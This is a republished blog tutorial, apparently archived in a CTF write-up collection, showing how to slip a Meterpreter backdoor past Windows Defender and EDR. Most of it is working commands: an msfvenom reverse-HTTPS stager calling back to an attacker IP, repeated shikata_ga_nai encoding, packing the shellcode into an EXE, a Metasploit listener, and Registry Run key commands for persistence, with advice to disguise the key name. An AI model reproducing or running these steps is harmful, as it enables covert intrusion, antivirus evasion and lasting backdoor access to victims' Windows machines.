# :skull: Evade EDR with Shellcode Injection and gain persistence using Registry Run Keys

> **Original Source:** [Evade EDR with Shellcode Injection and gain persistence using Registry Run Keys](https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a)
> **Platform:** infosecwriteups.com | **Category:** `PWN`

---

# Evade EDR with Shellcode Injection and gain persistence using Registry Run Keys


Gaining a foothold in an internal network can be challenging, as AV and Defender make this a little tougher. Modern Windows versions have put in place some mitigation that prevents the shellcode to run properly. The issue is caused by the fact that the shellcode needs RWX memory which is flagged when the shellcode is executed.


Shellcode injection might be very helpful for APT or Red Teamers during Pentesting, as they inject the malicious EXE and migrate the process into a trusted one by EDR. No suspicious behavior at all!

## Encrypting the C2 communication


Transmitting data over an unencrypted Tunnel is not very recommended, it is always a great idea to replace the default SSL that Metasploit uses when generating stagers, so the communication between the stager and the C2 framework is encrypted. We can create a private RSA key and a Server Certificate for the C2 server-side.

>

openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout rsaprivate.key -out servercertificate.crt


Then merging this together in a .pem file and we have created a concatenated certificate.

>

cat rsaprivate.key servercertificate.crt > my.pem


## Generating an encoded shellcode


Generate a Metasploit stager using the certificate and making almost obfuscated using *shikata_ga_nai* for implementing a polymorphic XOR additive feedback encoder.

>

msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.1.46 LPORT=8888 — platform windows -a x86 HandlerSSLCert=./my.pem StagerVerifySSLCert=true -s 42 — smallest -e x86/shikata_ga_nai -i 9 -f raw| msfvenom — platform windows -a x86 -e x86/call4_dword_xor -i 6 -b “\x00\x0a\x0d” -f raw > shellcode.raw


*Encoding shellcode with 9 iterations*


Once the shellcode is successfully generated, we will pack it into EXE.

## Packaging the shellcode


There is an open-source tool called [Shecodnject](https://github.com/TaroballzChen/shecodject) which nicely packages our generated shellcode into EXE. Open the tool using python3 as root:

>

sudo python3 shecodnject.py


Load scc module, set the shellcode.raw file which we previously generated and run the module to read the shellcode inside the file.

>

scc
set source /set/location/to/shellcode.raw
run


Exit the module by typing back. Now that the shellcode is read by the tool, we will pack it into an EXE, so enter the following commands 1 by 1:

>

exe
set noconsole False
run


The process of packaging will take a while. Once finished the output will be saved inside /output inside shecodeject folder


## Get kleiton0x7e’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


The EXE is generated and ready to evade modern EDRs and Windows Defender. Let’s test if it gets detected by Windows Defender:


*Windows Defender bypassed*


It is bypassed, with no detection at all. Now it’s time to set a listener in Metasploit and hopefully get a shell:

>

msfconsole -q -x ‘use exploit/multi/handler; set ExitOnSession false; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST 192.168.1.46; set LPORT 8888; set HandlerSSLCert /home/nade/Desktop/my.pem; set StagerVerifySSLCert true; set SessionCommunicationTimeout 600; run -j -z’


For the sake of the statistics, this is the detection rate when scanning in various AVs:


## Gaining persistence using Registry Run Keys


For persistence, we will inject our backdoor into a Registry Run Key. Luckily Metasploit has a module for this port-exploitation. The module requires the following configuration and will drop an executable at a writable location on the compromised system. In this case, we will upload our backdoor which is the same stager as the one we used for gaining (on our local machine I have called it fin.exe) on the target machine -> C:\tmp\fin.exe


First, we upload fin.exe in C:\tmp


`use post/windows/manage/persistence_exe
set REXEPATH /home/nade/Desktop/fin.exe
set REXENAME fin.exe
set SESSION 2
set STARTUP USER
set LOCALEXEPATH C:\\tmp
run`


The next time that the user will login with the system a new Meterpreter session will open (a black cmd screen will pop-up where it executed the backdoor and then automatically closes).

## Gaining persistence the manual way


Alternatively, you can use these commands to manually add these 4 Registry Run Keys so our backdoor fin.exe will be injected. In the demo I have added a random Value NotAVirus, but you don’t want to leave it that way, you know. Before working with Registries, make sure to upload the backdoor in the target system (which in my case: C:\tmp\fin.exe).


```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"
```

---

*Originally published on [Medium](https://infosecwriteups.com/evade-avs-edr-with-shellcode-injection-159dde4dba1a). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of pwn CTF writeups.*
